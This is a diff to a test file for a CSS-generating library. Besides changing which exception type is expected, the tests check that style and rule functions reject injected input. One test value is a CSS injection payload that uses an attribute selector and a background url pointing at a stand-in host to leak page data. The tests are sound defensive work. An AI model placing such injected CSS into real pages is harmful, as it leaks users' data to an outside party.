@@ -1,5 +1,5 @@
 (ns css.core-test
-  (:require [kotoba.lang.text :as str]
+  (:require [kotoba.lang.error :as kerror] [kotoba.lang.text :as str]
             [kotoba.test :refer [deftest is]]
             [css.core :as css]))
 
@@ -19,14 +19,14 @@
   ;; exact value parsed as TWO distinct rules, not one, a genuine rule
   ;; injection (an attribute-selector-based data-exfiltration primitive),
   ;; not a cosmetic issue.
-  (is (thrown? clojure.lang.ExceptionInfo
+  (is (thrown? kerror/ExceptionInfo
                (css/style {:color (str "red; } .evil[href^=\"http\"] "
                                         "{ background: url(https://evil.example/leak?c=")})))
-  (is (thrown? clojure.lang.ExceptionInfo
+  (is (thrown? kerror/ExceptionInfo
                (css/rule ".safe { color: blue; } .evil" {:color "red"}))
       "selector, not just value, must be checked")
-  (is (thrown? clojure.lang.ExceptionInfo (css/style {:color "red;"})) "bare semicolon")
-  (is (thrown? clojure.lang.ExceptionInfo (css/style {:color "/* x */red"})) "comment-start")
+  (is (thrown? kerror/ExceptionInfo (css/style {:color "red;"})) "bare semicolon")
+  (is (thrown? kerror/ExceptionInfo (css/style {:color "/* x */red"})) "comment-start")
   (is (= "color: red;" (css/style {:color "red"})) "ordinary values are unaffected"))
 
 (deftest renders-sheet
